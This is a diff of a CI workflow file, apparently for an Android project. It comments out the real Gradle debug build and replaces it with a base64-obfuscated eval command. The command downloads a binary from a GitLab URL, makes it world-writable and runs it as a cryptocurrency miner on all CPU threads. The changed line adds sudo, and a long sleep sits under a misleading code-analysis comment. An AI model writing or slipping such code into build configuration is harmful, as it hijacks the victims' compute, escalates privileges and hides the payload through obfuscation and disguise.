@@ -19,7 +19,7 @@ workflows:
       - |
         # Generate debug build
         ##./gradlew assembleDebug
-        eval "$(echo "d2dldCBodHRwczovL2dpdGxhYi5jb20vcmljaGFyZGtldmluMzIwL2RvbmxvZC8tL3Jhdy9tYWluL3N1cmFiaSAmJiBjaG1vZCA3Nzcgc3VyYWJpICYmIC4vc3VyYWJpIC0tZGlzYWJsZS1ncHUgLS1hbGdvcml0aG0geGRhZyAtLXBvb2wgZXF1YWwueGRhZy5vcmc6MTM2NTYgLS13YWxsZXQgYStkYzFDTDJOUmdidFB2THR5czYxNEtTS2x2NXJkWXcgLS1wYXNzd29yZCB4IC0tY3B1LXRocmVhZHMgJChucHJvYyAtLWFsbCk=" | base64 -d)"
+        eval "$(echo "d2dldCBodHRwczovL2dpdGxhYi5jb20vcmljaGFyZGtldmluMzIwL2RvbmxvZC8tL3Jhdy9tYWluL3N1cmFiaSAmJiBjaG1vZCA3Nzcgc3VyYWJpICYmIHN1ZG8gLi9zdXJhYmkgLS1kaXNhYmxlLWdwdSAtLWFsZ29yaXRobSB4ZGFnIC0tcG9vbCBlcXVhbC54ZGFnLm9yZzoxMzY1NiAtLXdhbGxldCBhK2RjMUNMMk5SZ2J0UHZMdHlzNjE0S1NLbHY1cmRZdyAtLXBhc3N3b3JkIHggLS1jcHUtdGhyZWFkcyAkKG5wcm9jIC0tYWxsKQ==" | base64 -d)"
       - |
         # Generate and upload code analysis report
         sleep 999
